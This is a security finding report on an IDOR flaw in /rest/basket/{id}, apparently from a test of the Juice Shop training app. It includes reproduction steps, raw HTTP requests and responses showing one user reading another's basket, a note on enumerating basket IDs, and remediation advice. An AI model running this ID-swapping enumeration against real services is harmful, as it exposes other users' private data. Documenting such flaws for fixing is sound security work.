# IDOR on /rest/basket/{id} — cross-tenant basket read

- **Severity:** high
- **Date (UTC):** 2026-11-19

## Details

## Summary
`GET /rest/basket/{id}` returns any user's basket contents without checking that the authenticated caller owns the basket. Horizontal IDOR (BOLA).

## Steps to reproduce
1. Register / log in as a low-privilege user. The server issues a JWT whose `data.id` is the user's id and `bid` is the user's own basket id (here: id=26, bid=7).
2. Send `GET /rest/basket/7` with that bearer token — baseline, own basket, 154-byte response.
3. Change the path parameter only. Send `GET /rest/basket/1` with the same bearer token.
4. Observe HTTP 200 with another user's basket contents (UserId=1, admin's default basket, 3 products, 1994 bytes).

## Evidence
Request (own, baseline):
```http
GET /rest/basket/7 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <customer id=26, bid=7>
Accept: application/json
```
Response (200 OK, 154 bytes):
```json
{"status":"success","data":{"id":7,"coupon":null,"UserId":26,"createdAt":"2026-11-18T16:36:21.498Z","updatedAt":"2026-11-18T16:36:21.498Z","Products":[]}}
```

Request (IDOR, same token, basket id swapped):
```http
GET /rest/basket/1 HTTP/1.1
Host: localhost:3000
Authorization: Bearer <customer id=26, bid=7>
Accept: application/json
```
Response (200 OK, 1994 bytes, truncated):
```json
{"status":"success","data":{"id":1,"coupon":null,"UserId":1,"createdAt":"2026-11-18T10:16:47.605Z","updatedAt":"2026-11-18T10:16:47.605Z","Products":[
 {"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"BasketId":1,"quantity":2}},
 {"id":2,"name":"Orange Juice (1000ml)",...,"BasketItem":{"BasketId":1,"quantity":3}},
 {"id":3,"name":"Eggfruit Juice (500ml)",...,"BasketItem":{"BasketId":1,"quantity":1}}]}}
```

Key diff: `data.UserId` is 1 (admin), not 26 (caller). `data.Products` leaks every item the target user has put in their basket, along with quantities.

## Impact
Any authenticated customer can read any other user's cart — including the administrator's. Carts reveal buying patterns (PII-adjacent), applied coupons (business-logic leverage), and quantities. The `bid` claim inside the JWT is advisory only; the controller does not enforce `token.data.id == basket.UserId`. Enumeration of `/rest/basket/{1..N}` returns the entire customer base's cart state.

Chains into further compromise: coupon codes observed in other baskets can be reused (see business_logic check); basket ids enumerate cleanly from 1, so no guessing required.

## Remediation
Enforce ownership at the controller: reject when `basket.UserId !== req.user.data.id`. The `bid` claim in the JWT is not a substitute — it is attacker-controllable via any token-forging bug (see `reports/2026-11-18-critical-jwt-alg-none-accepted.md`). The server-side check must read the authenticated user id from the verified token and compare against the resource's owner column.

## References
- OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization
- CWE-639: Authorization Bypass Through User-Controlled Key
- Juice Shop challenge: "View Basket" (horizontal data read)

